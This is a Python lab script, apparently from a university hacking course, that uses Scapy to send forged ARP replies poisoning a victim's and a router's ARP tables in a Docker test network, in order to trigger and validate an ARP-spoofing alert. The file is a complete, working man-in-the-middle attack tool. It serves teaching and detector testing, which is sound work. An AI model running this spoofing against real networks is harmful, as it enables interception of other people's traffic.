"""
arp_spoof_sim.py
================
Simulación de ARP Spoofing para validar alert_arpspoof
Práctica 3: MITM y Suplantación
Técnicas de Hacking — Universidad Europea de Madrid

Uso (dentro del contenedor atacante):
    python3 arp_spoof_sim.py
"""

from __future__ import annotations
import time
import logging
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger(__name__)

# ── IPs del escenario Docker ──────────────────────────────
IP_VICTIMA  = "172.19.0.10"   # víctima
IP_ROUTER   = "172.19.0.2"    # router
MAC_ATACANTE = "aa:bb:cc:dd:ee:ff"  # MAC falsa del atacante
IFACE       = "eth0"


def spoof_arp(target_ip: str, spoof_ip: str, iface: str = IFACE) -> None:
    """
    Envía un paquete ARP falso al target_ip diciéndole que
    spoof_ip tiene la MAC del atacante.
    """
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,                    # is-at (respuesta)
        pdst=target_ip,          # IP destino (víctima o router)
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=spoof_ip,           # IP que suplantamos
        hwsrc=MAC_ATACANTE,      # nuestra MAC falsa
    )
    sendp(pkt, iface=iface, verbose=False)
    log.info("ARP falso enviado: %s tiene %s → %s", spoof_ip, MAC_ATACANTE, target_ip)


def run_attack(rounds: int = 10, interval: float = 1.0) -> None:
    """
    Ejecuta el ataque ARP Spoofing en bucle:
    - Envenena la tabla ARP de la víctima (le dice que el router es el atacante)
    - Envenena la tabla ARP del router (le dice que la víctima es el atacante)
    """
    log.info("Iniciando simulación de ARP Spoofing (%d rondas)…", rounds)
    for i in range(rounds):
        log.info("Ronda %d/%d", i + 1, rounds)
        # Envenenar víctima: "el router (IP_ROUTER) tiene MAC_ATACANTE"
        spoof_arp(target_ip=IP_VICTIMA, spoof_ip=IP_ROUTER)
        # Envenenar router: "la víctima (IP_VICTIMA) tiene MAC_ATACANTE"
        spoof_arp(target_ip=IP_ROUTER,  spoof_ip=IP_VICTIMA)
        time.sleep(interval)
    log.info("Simulación completada.")


if __name__ == "__main__":
    run_attack(rounds=10, interval=1.0)